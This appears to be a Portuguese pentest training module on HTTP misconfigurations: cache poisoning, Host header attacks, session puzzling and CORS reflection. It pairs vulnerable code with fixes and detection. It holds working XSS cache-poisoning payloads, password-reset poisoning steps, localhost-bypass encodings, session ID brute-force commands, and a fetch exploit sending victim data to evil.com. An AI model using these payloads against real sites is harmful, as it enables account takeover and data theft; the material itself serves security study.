---
title: "HTTP Misconfigurations"
---

# Abuso de Misconfiguracoes HTTP

## A Falha: Headers HTTP Processados Como Dados Confiáveis Sem Validação

Misconfiguracoes HTTP exploram discrepancias entre como diferentes sistemas (cache, proxy, servidor de aplicacao) interpretam e processam requests HTTP. Mas a raiz do problema e mais especifica: headers HTTP sao controlaveis pelo cliente — `X-Forwarded-For`, `Host`, `Origin`, `X-Forwarded-Host` nao sao dados do servidor, sao dados que o atacante pode forjar livremente.

A suposicao de design errada: o desenvolvedor implementa logica baseada em headers como `Host` (para construir URLs em emails de reset de senha), `X-Forwarded-For` (para rate limiting por IP), ou `Origin` (para validacao CORS) — assumindo que esses valores sao confiáveis porque "sao do protocolo HTTP". Na realidade, qualquer um deles pode ser forjado pelo atacante.

**Perspectiva do desenvolvedor vs. da realidade:**

Para cache poisoning: o desenvolvedor configura o cache para usar `Host + Path` como chave de cache, mas nao percebe que o parametro `ref` passado na query string e refletido na resposta sem ser parte da chave. Um atacante injeta um payload XSS no parametro `ref` e forca um cache miss — a resposta envenenada e cacheada e servida para todos os usuarios que acessarem aquela URL.

Expor mensagens de erro internas (como "Este endpoint deveria ser acessado apenas internamente") já configura misconfiguracao de segurança — mesmo sem explorar o SSRF que a mensagem revela.

Middlewares de autenticacao que verificam `X-Admin: true` no header — em vez de verificar token ou sessao — criam um bypass trivial: qualquer cliente pode adicionar esse header manualmente.

**Consequencia antes de ver a exploracao:** um unico request malicioso bem-sucedido em cache poisoning afeta todos os usuarios subsequentes sem interacao adicional. Em password reset poisoning, o atacante obtém o token do admin sem precisar de acesso a conta.

Impactos principais:
- **Web Cache Poisoning:** Injetar conteudo malicioso (XSS, redirect) no cache que e servido para todos os usuarios subsequentes
- **Host Header Attacks:** Bypass de autenticacao, roubo de token de reset de senha, XSS via Host header refletido
- **Session Puzzling:** Bypass de autenticacao, account takeover via manipulacao de variaveis de sessao

Severidade: Critica em producao porque um unico ataque bem-sucedido afeta multiplos usuarios sem interacao adicional.

---

## Causa Raiz

### Cache Poisoning — Parametros Unkeyed Refletidos na Resposta

O cache armazena respostas baseado em uma "chave de cache" (cache key), tipicamente `Host + Path`. Parametros que nao fazem parte da chave sao chamados "unkeyed" — o cache os ignora ao decidir se tem uma resposta armazenada. Se um parametro unkeyed e refletido na resposta pelo servidor, o atacante pode injetar payload nele e forcar o cache a armazenar a resposta envenenada.

```nginx
# VULNERAVEL — cache key inclui apenas host e URI, mas servidor processa 'ref'
proxy_cache_key "$host$request_uri";
# Se /index.php?lang=en&ref=PAYLOAD e processado pelo servidor
# mas a cache key e apenas /index.php?lang=en
# a resposta com PAYLOAD e cacheada como se fosse para /index.php?lang=en

# SEGURO — definir explicitamente quais parametros sao keyed
proxy_cache_key "$scheme$request_method$host$request_uri";
# Incluir todos os parametros que o servidor processa, OU
# nao cachear respostas que contem input do usuario refletido
```

### Host Header — Confiança Cega no Header Controlável pelo Cliente

```php
// VULNERAVEL — usa Host header para construir URL de reset
$reset_url = "http://{$_SERVER['HTTP_HOST']}/reset?token=" . $token;
mail($user->email, "Reset sua senha", "Clique: " . $reset_url);
// Atacante envia request com Host: evil.com
// Email enviado para admin contem link para evil.com/reset?token=SECRET

// SEGURO — URL configurada no servidor, nao derivada do Host header
$base_url = getenv('APP_BASE_URL');  // https://app.empresa.com
$reset_url = $base_url . "/reset?token=" . $token;
```

### Middleware de Autenticacao — Header Como Controle de Acesso

Um padrão inseguro em Node/Express é a middleware `requireAdmin` verificar um header:

```javascript
// VULNERAVEL — qualquer cliente pode enviar este header
function requireAdmin(req, res, next) {
    if (req.headers['x-admin'] === 'true') {
        next();  // considera admin
    } else {
        res.status(403).json({ error: 'Forbidden' });
    }
}

// SEGURO — verificar token JWT ou sessao, nunca header arbitrario
function requireAdmin(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        if (decoded.role !== 'admin') {
            return res.status(403).json({ error: 'Not admin' });
        }
        req.user = decoded;
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
}
```

---

## Web Cache Poisoning, Host Header Injection e Session Puzzling

### Web Cache Poisoning

Caches web armazenam responses para melhorar performance. A cache key determina o que identifica uma resposta unica — tipicamente: Host + Path + parametros GET especificos.

**Cache key vs Unkeyed inputs:**
- Keyed: incluidos na cache key, diferenciam responses
- Unkeyed: ignorados na cache key mas processados pelo servidor

Se um parametro unkeyed e refletido na response, um atacante pode injetar payload que e cacheado e servido para todos os usuarios que solicitarem aquela cache key.

Fluxo de ataque:
1. Identificar parametro unkeyed refletido na response
2. Injetar payload no parametro unkeyed
3. Forcar cache miss para que o servidor processe e cachee a response envenenada
4. Todos os usuarios subsequentes recebem a response envenenada

**Fat GET Requests:**
Alguns servidores processam o corpo de requests GET, ignorando o fato de que GET nao deveria ter corpo. Se o cache usa apenas a URL como cache key mas o servidor processa o corpo, pode-se injetar payload:

```
GET /index.php?language=de HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 142

ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

**Parameter Cloaking (CVE-2020-28473 — Python Bottle):**
Python Bottle usa ponto-e-virgula como separador de parametros (alem do &). Caches que nao reconhecem `;` como separador tratam `a=b;ref=payload` como um valor unico para `a`, mas Bottle separa em dois parametros distintos.

Resultado: O cache armazena a response como se fosse request sem `ref`, mas o servidor processa `ref` com o payload injetado.

### Host Header Attacks

O header `Host` identifica o servidor de destino. Aplicacoes frequentemente confiam cegamente nele para construir URLs em emails de password reset, redirecionar usuarios apos autenticacao, e controlar acesso baseado no nome do host recebido.

**Override Headers:**
Proxies e load balancers frequentemente suportam headers que sobrescrevem o Host:
- `X-Forwarded-Host`
- `X-HTTP-Host-Override`
- `Forwarded`
- `X-Host`
- `X-Forwarded-Server`

Se a aplicacao processar esses headers sem validacao, um atacante pode injetar um host arbitrario.

**Authentication Bypass:**
Algumas aplicacoes verificam se o request vem de `localhost` ou IP interno para autorizar acesso admin:

```
GET /admin.php HTTP/1.1
Host: localhost
```

Se a verificacao for feita via Host header em vez de IP de origem, qualquer usuario pode fazer bypass.

**Password Reset Poisoning:**
O servidor usa o Host header para construir o link de reset de senha enviado por email. Injetar host do atacante faz o link apontar para o servidor do atacante.

### Session Puzzling

Session Puzzling e uma vulnerabilidade causada pelo tratamento inadequado de variaveis de sessao. Tres padroes principais:

**1. Variaveis de sessao compartilhadas entre processos:**
O mesmo nome de variavel de sessao e usado em processos distintos (ex: login e reset de senha). Configurar a variavel em um processo permite acesso autenticado via outro processo.

**2. Populacao prematura de sessao:**
O servidor popula variaveis de sessao ANTES de completar a validacao. Ex: armazenar username na sessao antes de verificar a senha. Se o redirect apos falha pode ser dropado, a sessao ja esta populada com dados de autenticacao.

**3. Valores default inseguros:**
Ao fazer logout, a sessao nao e destruida mas o user_id e setado para 0. Se 0 e o ID do admin, fazer logout pode resultar em acesso como admin.

**Session IDs fracos:**
- IDs curtos (menos de 16 bytes) podem ser brute-forcados
- IDs com entropia insuficiente (padroes detectaveis) podem ser preditos

---

## Identificacao

### Web Cache Poisoning

**1. Verificar headers de cache:**

```
GET / HTTP/1.1
Host: target.htb
```

Verificar response headers: `X-Cache`, `X-Cache-Status`, `CF-Cache-Status`, `Age`, `Cache-Control`

```
X-Cache-Status: MISS  <- primeiro request, servidor processou
X-Cache-Status: HIT   <- segundo request, cache serviu
```

**2. Identificar parametros unkeyed:**

Adicionar parametro aleatorio que nao existe:

```
GET /index.php?language=de&cachebuster=abc123 HTTP/1.1
```

Se o servidor retornar a mesma response, o parametro nao e incluido na cache key. Isso indica que outros parametros tambem podem ser unkeyed.

**3. Verificar se parametros sao refletidos:**

```
GET /index.php?ref=TESTVALUE&cachebuster=xyz789 HTTP/1.1
```

Se `TESTVALUE` aparecer na response, o parametro refletido pode ser usado para injetar payload.

**4. WCVS (Web-Cache-Vulnerability-Scanner):**

```bash
./wcvs -u http://target.wcp.htb/ -sp language=en -gr
```

**5. Identificar Fat GET:**

```
GET /index.php?language=de HTTP/1.1
Host: fatget.wcp.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

ref=TESTINJECTION
```

Se `TESTINJECTION` aparecer na response, Fat GET esta habilitado.

**6. Identificar Parameter Cloaking (Bottle):**

```
GET /?language=de&a=b;ref=TESTVALUE HTTP/1.1
Host: cloak.wcp.htb
```

Se `TESTVALUE` aparecer na response (Bottle separou no `;`), vulnerabilidade presente.

### Host Header Attacks

**1. Testar Host header arbitrario:**

```
GET / HTTP/1.1
Host: evil.com
```

Se a resposta refletir `evil.com` em algum link ou redirect, Host header e confiado sem validacao.

**2. Testar headers de override:**

```
GET / HTTP/1.1
Host: legitimo.htb
X-Forwarded-Host: evil.com
```

```
GET / HTTP/1.1
Host: legitimo.htb
X-HTTP-Host-Override: evil.com
```

**3. Testar bypass de autenticacao:**

```
GET /admin.php HTTP/1.1
Host: localhost
```

```
GET /admin.php HTTP/1.1
Host: 127.0.0.1
```

**4. Fuzzing de Host header com ffuf:**

```bash
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs 752
```

Onde `ips.txt` contem IPs internos (192.168.x.x, 10.x.x.x, 172.16.x.x, localhost, 127.0.0.1).

**5. Testar bypass de validacao — porta:**

```
GET / HTTP/1.1
Host: bypassingchecks.htb:1337
```

Algumas validacoes verificam apenas o hostname sem a porta, mas processam o host completo.

**6. Testar bypass de validacao — subdominio:**

```
GET / HTTP/1.1
Host: legitimate.com.evil.com
```

Validacao baseada em sufixo: `endswith("legitimate.com")` — verdadeiro, mas host e controlado pelo atacante.

**7. Bypass de blacklist de localhost:**

| Formato | Valor |
|---|---|
| Decimal | `2130706433` |
| Hex | `0x7f000001` |
| Octal | `0177.0000.0000.0001` |
| Zero | `0` |
| Short | `127.1` |
| IPv6 | `::1` |
| IPv4-in-IPv6 | `[0:0:0:0:0:ffff:127.0.0.1]` |
| Externo | `localtest.me` |

### Session Puzzling

**1. Mapear todos os fluxos da aplicacao:**

Identificar todos os processos que usam sessao:
- Login
- Logout
- Reset de senha (cada passo)
- Registro de usuario (cada passo)
- Checkout (cada passo)

**2. Analisar trafego de rede para identificar variaveis de sessao:**

Verificar se requests subsequentes dentro de um fluxo carregam o mesmo cookie de sessao. Se o backend nao recebe o dado no request mas ainda o processa, esta na sessao.

**3. Confirmar variaveis de sessao:**

Enviar o request sem o cookie de sessao:

```
POST /reset_2.php HTTP/1.1
Host: target.htb
Content-Length: 21

Answer=4&Submit=Login
```

Se redirecionar para login (novo cookie gerado), confirma que dados estao na sessao.

**4. Testar common session variables:**

Completar passo 1 de reset de senha (fornece username), depois acessar diretamente o endpoint autenticado:

```
POST /reset_1.php HTTP/1.1
Content-Length: 27

Username=admin&Submit=Login
```

Obter cookie. Acessar `/profile.php` com esse cookie — se logar como admin, session puzzle confirmado.

**5. Testar premature session population:**

Fazer login com credenciais invalidas e capturar o cookie SET pelo servidor antes do redirect de falha:

```
POST /login.php HTTP/1.1
Username=admin&Password=errada&Submit=Login
```

Response: `Set-Cookie: PHPSESSID=abc123`

Agora acessar `/profile.php` com `PHPSESSID=abc123` SEM seguir o redirect de falha.

**6. Analisar Session IDs:**

Verificar comprimento dos session IDs:

```
Set-Cookie: sessionID=a7sh
```

4 caracteres = facilmente brute-forcavel.

Verificar entropia com Burp Sequencer:
1. Click direito no request de login
2. Send to Sequencer
3. Sequencer Tab -> Live Capture
4. Aguardar 1000+ amostras
5. Analyze -> verificar bits de entropia efetiva
6. OWASP recomenda minimo 64 bits

---

## Exploitation

### Web Cache Poisoning — XSS via Unkeyed Parameter

**Payload para envenenar o cache:**

```
GET /index.php?language=de&ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script> HTTP/1.1
Host: webcache.htb
```

**Verificar se foi cacheado:**

```
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
```

Response deve conter `X-Cache-Status: HIT` e o script XSS injetado.

**Tecnica de cache buster:**

Durante o teste, usar parametro unico para nao envenenar o cache real:

```
GET /index.php?language=de&cachebuster=TEST123&ref=PAYLOAD HTTP/1.1
```

Remover o cachebuster apenas quando confirmar que o ataque funciona.

### Web Cache Poisoning — Fat GET

```
GET /index.php?language=de HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 142

ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

### Web Cache Poisoning — Parameter Cloaking (Bottle)

```
GET /?language=de&a=b;ref="><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script> HTTP/1.1
Host: cloak.wcp.htb
```

### Host Header — Password Reset Poisoning

**Passo 1 — Configurar receptor (Interactsh):**

```bash
# Instalar
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Iniciar cliente
interactsh-client
# Gera: abc123.oast.fun
```

**Passo 2 — Enviar reset com host manipulado:**

```
POST /forgot.php HTTP/1.1
Host: abc123.oast.fun
Content-Type: application/x-www-form-urlencoded

username=admin
```

O servidor envia email para admin contendo link `http://abc123.oast.fun/reset?token=SECRET`.

**Passo 3 — Interceptar o token:**

Verificar requests no painel do Interactsh — o admin clicou no link e o token aparece na URL.

**Passo 4 — Usar token para resetar senha:**

```
GET /reset?token=SECRET HTTP/1.1
Host: legitimo.htb
```

**Alternativas com headers de override:**

```
POST /forgot.php HTTP/1.1
Host: legitimo.htb
X-Forwarded-Host: abc123.oast.fun

username=admin
```

### Host Header — Cache + X-Forwarded-Host

Se `X-Forwarded-Host` e unkeyed no cache:

```
GET /index.php?language=de HTTP/1.1
Host: target.htb
X-Forwarded-Host: evil.com
```

Se a response incluir `evil.com` em links e for cacheada, todos os usuarios subsequentes receberao links apontando para o site do atacante.

### Host Header — Bypass de Autenticacao

```
GET /admin.php HTTP/1.1
Host: localhost
```

Se a aplicacao verificar `if ($_SERVER['HTTP_HOST'] == 'localhost')` em vez do IP real, este bypass funciona.

**Variacoes:**

```
GET /admin.php HTTP/1.1
Host: 127.0.0.1

GET /admin.php HTTP/1.1
Host: 0x7f000001

GET /admin.php HTTP/1.1
Host: 2130706433

GET /admin.php HTTP/1.1
Host: ::1
```

### Session Puzzling — Bypass via Common Session Variable

**Contexto:** Reset de senha usa `$_SESSION['Username']`, autenticacao verifica se `$_SESSION['Username']` existe.

```php
// reset_1.php
$_SESSION['Username'] = $_POST['Username'];
header("Location: reset_2.php");

// profile.php
if (!isset($_SESSION['Username'])) {
    header("Location: login.php");
    exit;
}
```

**Exploit:**

```
POST /reset_1.php HTTP/1.1
Content-Length: 27

Username=admin&Submit=Login
```

Obter cookie da response (PHPSESSID=XYZ).

Acessar diretamente:

```
GET /profile.php HTTP/1.1
Cookie: PHPSESSID=XYZ
```

Logado como admin sem saber a senha.

### Session Puzzling — Premature Population

**Contexto:** Login popula variaveis de sessao ANTES de verificar senha. So limpa se redirect de falha (`?failed=1`) e seguido.

```php
// login.php
$_SESSION['Username'] = $_POST['Username'];
$_SESSION['Active'] = true;

if (login($Username, $_POST['Password'])) {
    header("Location: profile.php");
} else {
    header("Location: login.php?failed=1");
}

// Limpa sessao apenas se ?failed existe
if (isset($_GET['failed'])) {
    session_destroy();
    session_start();
}
```

**Exploit:**

```
POST /login.php HTTP/1.1
Content-Length: 38

Username=admin&Password=errada&Submit=Login
```

Response: `Location: login.php?failed=1` + `Set-Cookie: PHPSESSID=ABC`

NAO seguir o redirect. Acessar diretamente:

```
GET /profile.php HTTP/1.1
Cookie: PHPSESSID=ABC
```

A sessao ainda contem `Username=admin` e `Active=true` — logado como admin.

### Session Puzzling — Account Takeover via Processos Concorrentes

**Contexto:** Registro e reset de senha usam a mesma variavel `Phase` para rastrear o passo atual.

```php
// register_1.php -> Phase = 2
// register_2.php -> verifica Phase == 2
// reset_1.php -> Phase = 2
// reset_2.php -> verifica Phase == 2
```

**Exploit para resetar senha do admin sem conhecer resposta de seguranca:**

1. POST `/reset_1.php` com `Username=admin` → obter cookie com Phase=2, reset_username=admin
2. Com MESMO cookie: POST `/register_1.php` com dados aleatorios → Phase = 2 (fase 1 do registro)
3. Com MESMO cookie: POST `/register_2.php` → Phase passa para 3 (fase 2 do registro completa)
4. Com MESMO cookie: POST `/reset_3.php` com nova senha → Phase=3, reset funciona sem verificar resposta de seguranca

A chave: a sessao "acha" que completou as fases de verificacao pelo processo de registro, mas o username sendo resetado e o do admin.

### Session ID Brute-Force

```bash
# Gerar wordlist com crunch para IDs de 4 caracteres alfanumericos
sudo apt install crunch
crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt

# Brute-force com ffuf
ffuf -u http://127.0.0.1/profile.php -b 'sessionID=FUZZ' -w wordlist.txt -fc 302 -t 10
```

Resultado positivo: status 200 em vez de 302 (redirect para login).

---

## Ferramentas

### WCVS (Web-Cache-Vulnerability-Scanner)

```bash
# Instalar
git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
cd Web-Cache-Vulnerability-Scanner
go build -o wcvs .

# Scan basico
./wcvs -u http://target.wcp.htb/

# Com parametro keyed especificado
./wcvs -u http://target.wcp.htb/ -sp language=en

# Gerar report
./wcvs -u http://target.wcp.htb/ -sp language=en -gr

# Com cookie
./wcvs -u http://target.wcp.htb/ -cookie "auth=TOKEN"

# Modo verboso
./wcvs -u http://target.wcp.htb/ -v
```

### ffuf

```bash
# Fuzzing de Host header
ffuf -u http://IP:PORT/admin.php -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ' -fs 752

# Fuzzing de parametros GET
ffuf -u http://target.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Brute-force de session ID
ffuf -u http://target.htb/profile.php -b 'sessionID=FUZZ' -w wordlist.txt -fc 302
```

### Interactsh (Receptor OOB)

```bash
# Instalar
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Iniciar e obter dominio OOB
interactsh-client
# Output: abc123def456.oast.fun

# Com token de autenticacao (instancia privada)
interactsh-client -server https://interactsh.empresa.com -token TOKEN
```

### Burp Suite

```
# Web Cache Poisoning:
# 1. Burp -> Target -> Site Map -> identificar cache headers nas responses
# 2. Param Miner extension: automatiza descoberta de parametros unkeyed
#    Extensions -> BApp Store -> Param Miner

# Host Header:
# 1. Repeater: modificar Host header manualmente
# 2. Intruder: fuzzing de Host com lista de IPs/hostnames

# Session Analysis:
# 1. HTTP History: comparar cookies entre requests
# 2. Sequencer: analisar entropia de session IDs
```

### Crunch

```bash
# Instalar
sudo apt install crunch

# Sintaxe: crunch <min> <max> <charset> -o output.txt
# Gerar IDs de 4 caracteres alfanumericos minusculos + digitos
crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt

# Gerar IDs de 8 hex chars
crunch 8 8 "0123456789abcdef" -o hex_wordlist.txt

# Gerar somente letras maiusculas
crunch 6 6 "ABCDEFGHIJKLMNOPQRSTUVWXYZ" -o upper.txt
```

---

## Detecção e Mitigação

### Web Cache Poisoning

Monitorar:
- Requests com parametros incomuns que nao afetam a logica mas aparecem na response
- Responses com `X-Cache: HIT` contendo conteudo inesperado
- Aumento de relatos de XSS por usuarios sem que haja novo codigo deployado

```bash
# Verificar responses cacheadas com scripts
grep -r "<script" /var/cache/nginx/ 2>/dev/null
grep -r "javascript:" /var/cache/nginx/ 2>/dev/null

# Monitorar header X-Cache em proxies
tail -f /var/log/nginx/access.log | grep "HIT"
```

### Host Header Attacks

```bash
# Detectar Host headers suspeitos nos logs
grep -v "^$(hostname)\|^127\.\|^localhost" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c

# Verificar se X-Forwarded-Host e processado
grep "X-Forwarded-Host" /var/log/nginx/access.log | grep -v "^$(hostname)"
```

### Session Puzzling

```bash
# PHP — verificar session variables
ls -la /var/lib/php/sessions/
cat /var/lib/php/sessions/sess_SESSIONID

# Verificar codigo para reutilizacao de variaveis de sessao
grep -rn "\$_SESSION\[" /var/www/ --include="*.php" | sort | awk -F"'" '{print $2}' | sort | uniq -c | sort -rn

# IDs curtos (menos de 16 chars)
grep "Set-Cookie: .*=.\{1,15\};" /var/log/nginx/access.log
```

### Prevenção

**Cache Poisoning:**

```nginx
# Definir cache key explicitamente (sem parametros indesejados)
proxy_cache_key "$scheme$request_method$host$request_uri";

# Ignorar parametros de tracking no cache
proxy_cache_key "$scheme$host$uri";

# Nao cachear responses com inputs do usuario
if ($arg_ref) {
    add_header Cache-Control "no-store";
}
```

**Host Header:**

```php
// Validar Host header contra lista branca
$allowed_hosts = ['app.empresa.com', 'www.empresa.com'];
if (!in_array($_SERVER['HTTP_HOST'], $allowed_hosts)) {
    http_response_code(400);
    die('Invalid Host');
}

// Para password reset, usar URL configurada no servidor — nao o Host header
$reset_url = "https://app.empresa.com/reset?token=" . $token;
```

**Session:**

```php
// Usar nomes de variavel unicos por processo
// Em vez de $_SESSION['Username'] em todos os lugares:
$_SESSION['reset_username'] = $_POST['Username'];  // Reset
$_SESSION['auth_username'] = $username;           // Login autenticado

// Destruir sessao completamente no logout (nao apenas setar para 0)
session_destroy();
session_start();
session_regenerate_id(true);

// Nao popular sessao antes de validar credenciais
if (login($username, $password)) {
    $_SESSION['auth_username'] = $username;
    $_SESSION['authenticated'] = true;
}
// Se login falhar, nao setou nada na sessao

// Session ID longo e aleatorio (configuracao php.ini)
// session.entropy_length = 32
// session.hash_function = sha256
// Gera IDs de 64 caracteres hex com alta entropia
```

---

---

## CORS — Origin Reflection (AWAE Ch.11)

### Causa

Developer reflete dinamicamente qualquer `Origin` recebido no header `Access-Control-Allow-Origin` para suportar múltiplos subdomínios sem manter lista estática:

```python
# código vulnerável
response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

### Detecção

```bash
curl -si -H "Origin: https://evil.attacker.com" https://TARGET/api/endpoint | grep -i "access-control"
# saída crítica:
# Access-Control-Allow-Origin: https://evil.attacker.com   ← refletiu
# Access-Control-Allow-Credentials: true                   ← cookies incluídos
```

### Tabela de Impacto

| Configuração CORS | Envia cookies | Lê resposta cross-origin |
|---|---|---|
| `ACAO: *` (sem ACAC) | Não — credenciais ignoradas | Apenas dados públicos |
| `ACAO: *` + `ACAC: true` | Inválido — browser rejeita | N/A |
| `ACAO: <reflected>` + `ACAC: true` | **SIM** | **SIM** — crítico! |
| `ACAO: null` + `ACAC: true` | Via file:// e sandbox iframe | Sim — cuidado |

**Por que wildcard + credentials não funciona**: spec CORS proíbe combinação — browser rejeita na fase de validação de resposta.

### Impacto

CORS refletivo com `ACAC: true` equivale a não ter autenticação para a API: qualquer origem pode ler dados autenticados da vítima. Exploração requer XSS ou social engineering para executar JS no browser da vítima:

```javascript
// exploit hospedado em evil.com
fetch('https://TARGET/api/userdata', { credentials: 'include' })
  .then(r => r.text())
  .then(data => fetch('https://evil.com/cb?d=' + encodeURIComponent(data)));
```

### Mitigação

```python
# whitelist explícita — nunca refletir Origin sem verificar
ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']

origin = request.headers.get('Origin')
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
# não incluir ACAO se origem não autorizada
```

---

## Módulos Relacionados

`01_request_smuggling.md` cobre o desync entre frontend e backend via ambiguidade HTTP, que pode ser combinado com cache poisoning para ampliar impacto. `03_tls_https_attacks.md` explica como HSTS previne SSL stripping e protege cookies em trânsito. `../11_apis_avancado/01_rest_api_attacks.md` detalha o uso do header X-Forwarded-For para bypass de rate limiting em APIs. `../04_xss/03_csrf.md` mostra como CORS reflection pode ser combinado com CSRF para atingir RCE via workflow server.
